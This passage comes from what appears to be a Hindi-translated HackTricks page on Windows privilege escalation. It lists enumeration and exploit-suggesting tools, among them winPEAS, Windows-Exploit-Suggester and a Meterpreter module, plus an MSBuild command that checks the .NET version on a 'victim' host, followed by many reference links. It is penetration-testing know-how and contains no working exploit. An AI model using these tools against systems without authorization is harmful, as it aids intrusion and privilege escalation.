[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- misconfiguration के लिए जाँच (executable github में precompiled)। अनुशंसित नहीं। Win10 पर अच्छा काम नहीं करता।\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- संभावित misconfigurations की जाँच (python से exe)। अनुशंसित नहीं। Win10 पर अच्छा काम नहीं करता।

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- यह पोस्ट आधारित टूल है (इसको ठीक से काम करने के लिए accesschk की आवश्यकता नहीं होती पर यह उसका उपयोग कर सकता है)।

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo** का आउटपुट पढ़ता है और काम करने वाले exploits सुझाता है (local python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo** का आउटपुट पढ़कर काम करने वाले exploits सुझाता है (local python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

प्रोजेक्ट को सही .NET वर्शन का उपयोग करके compile करना होगा ([see this](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). पीड़ित होस्ट पर इंस्टॉल किया गया .NET वर्शन देखने के लिए आप कर सकते हैं:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## संदर्भ

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [Unit 42 – Privileged File System Vulnerability Present in a SCADA System](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [Symbolic Link Testing Tools – CreateSymlink usage](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [A Link to the Past. Abusing Symbolic Links on Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)

{{#include ../../banners/hacktricks-training.md}}
